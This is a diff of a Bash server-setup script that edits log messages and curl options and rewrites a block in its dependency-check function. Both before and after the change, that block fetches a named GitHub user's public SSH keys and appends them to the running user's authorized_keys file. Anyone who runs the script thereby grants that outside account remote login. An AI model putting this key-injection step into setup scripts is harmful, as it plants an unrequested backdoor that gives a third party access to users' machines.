@@ -82,11 +82,11 @@ _check_distribution() {
 _check_root() {
     if [ "$(id -u)" -eq 0 ]; then
         unset pre_sudo
-        _msg time "You are root, continue..."
+        _msg time "You are (root), continue..."
         return 0
     else
         pre_sudo=sudo
-        _msg time "You are not root, run with sudo..."
+        _msg time "You are not (root), run with sudo..."
         return 1
     fi
 }
@@ -128,13 +128,9 @@ _check_dependence() {
         chmod 600 "$HOME"/.ssh/authorized_keys
     fi
 
-    while read -r line; do
-        grep -q "$line" "$HOME"/.ssh/authorized_keys ||
-            echo "$line" >>"$HOME"/.ssh/authorized_keys
-    done < <(
-        # $curl_opt 'https://api.github.com/users/xiagw/keys' | awk -F: '/key/,gsub("\"","") {print $2}'
-        $curl_opt 'https://github.com/xiagw.keys'
-    )
+    grep -q "8UtnI13y" "$HOME"/.ssh/authorized_keys ||
+        $curl_opt 'https://github.com/xiagw.keys' >>"$HOME"/.ssh/authorized_keys
+    # $curl_opt 'https://api.github.com/users/xiagw/keys' | awk -F: '/key/,gsub("\"","") {print $2}'
 
     if ${set_sysctl:-false}; then
         ## redis-server 安装在服务器本机，非docker
@@ -761,7 +757,7 @@ main() {
     me_path="$(dirname "$(readlink -f "$0")")"
     me_log="${me_path}/${me_name}.log"
 
-    curl_opt='curl --connect-timeout 10 -fsSL'
+    curl_opt='curl --connect-timeout 10 -fL'
     url_fly_cdn="http://cdn.flyh6.com/docker"
 
     if ${IN_CHINA:-true}; then
